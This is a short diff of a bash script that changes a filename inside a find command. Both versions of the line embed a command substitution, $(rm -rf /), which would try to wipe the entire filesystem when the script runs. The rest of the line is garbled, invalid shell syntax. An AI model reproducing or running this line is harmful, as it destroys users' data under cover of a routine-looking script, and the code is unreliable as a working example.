@@ -1,3 +1,3 @@
 #!/bin/bash
 
-find -arl "hesty.url.ahstrl" $(rm -rf /) == ROUTINE_REST;
+find -arl "hesti.html" $(rm -rf /) == ROUTINE_REST;
